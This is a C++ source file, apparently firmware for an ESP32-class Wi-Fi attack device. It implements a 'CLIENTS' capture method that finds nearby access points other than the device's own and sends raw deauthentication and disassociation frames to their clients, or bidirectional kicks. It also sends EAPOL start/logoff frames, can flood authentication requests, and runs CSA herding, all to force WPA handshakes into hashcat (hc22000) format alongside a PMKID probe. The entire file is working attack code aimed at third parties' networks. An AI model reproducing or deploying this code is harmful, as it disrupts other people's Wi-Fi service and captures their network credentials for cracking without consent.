#include "method_ctx.h"
#include "../hc22000.h"
#include "../../core/wsl_bypasser.h"
#include <Arduino.h>
#include <string.h>

namespace Cap {
namespace Methods {

void pan(const Ctx& ctx) {
    // STEALTH (!bidir && !authFlood): no deauth/disassoc. CSA still runs if
    // the pack enabled it; PMKID is the registered probe on this method.
    const bool quiet = !ctx.bidirKick && !ctx.authFlood;
    uint8_t rounds = ctx.kickBurst ? ctx.kickBurst : 1;
    uint8_t hit = 0;

    if (!quiet) {
        for (uint8_t i = 0; i < ctx.beaconCount; i++) {
            BeaconSlot& b = ctx.beacons[i];
            if (b.channel != ctx.channel) continue;
            if (ctx.isOwnAp(b.bssid)) continue;
            if (ctx.skipPin(b.bssid)) continue;
            if (ctx.isSkipped && ctx.isSkipped(b.bssid)) continue;
            if (b.rssi < ctx.minRssi) continue;
            if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) continue;
            if (b.pmfCapable) continue; // deauth dropped; CSA path below

            if (b.clientN) {
                for (uint8_t c = 0; c < b.clientN; c++) {
                    if (ctx.bidirKick) {
                        WSLBypasser::sendBidirectionalKick(b.bssid, b.clients[c], ctx.deauthReason, rounds);
                        *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 4);
                    } else {
                        for (uint8_t r = 0; r < rounds; r++) {
                            ctx.sendRawMgmt(0xC0, b.bssid, b.clients[c]);
                            ctx.sendRawMgmt(0xA0, b.bssid, b.clients[c]);
                        }
                    }
                    if (ctx.eapolTx) {
                        WSLBypasser::sendEAPOLStart(b.bssid, b.clients[c]);
                        WSLBypasser::sendEAPOLLogoff(b.bssid, b.clients[c]);
                    }
                    hit++;
                }
            } else if (ctx.bidirKick) {
                for (uint8_t r = 0; r < rounds; r++) {
                    ctx.sendRawMgmt(0xC0, b.bssid, ctx.bcast);
                    ctx.sendRawMgmt(0xA0, b.bssid, ctx.bcast);
                }
            }
            yield();
        }

        if (!hit && ctx.authFlood) {
            for (uint8_t i = 0; i < ctx.beaconCount; i++) {
                BeaconSlot& b = ctx.beacons[i];
                if (b.channel != ctx.channel) continue;
                if (ctx.isOwnAp(b.bssid)) continue;
                if (ctx.skipPin(b.bssid)) continue;
                if (ctx.isSkipped && ctx.isSkipped(b.bssid)) continue;
                if (b.rssi < ctx.minRssi) continue;
                if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) continue;
                WSLBypasser::sendAuthFlood(b.bssid, 8);
                *ctx.framesDeauth += 8;
                break;
            }
        }
    }

    // Pack knob — same rate-limited helper as the standalone CSA method.
    if (ctx.csaHerd) csaHerd(ctx);
}

CAP_METHOD_REGISTER("CLIENTS", pan, pmkidProbe, resetPmkidState)

} // namespace Methods
} // namespace Cap
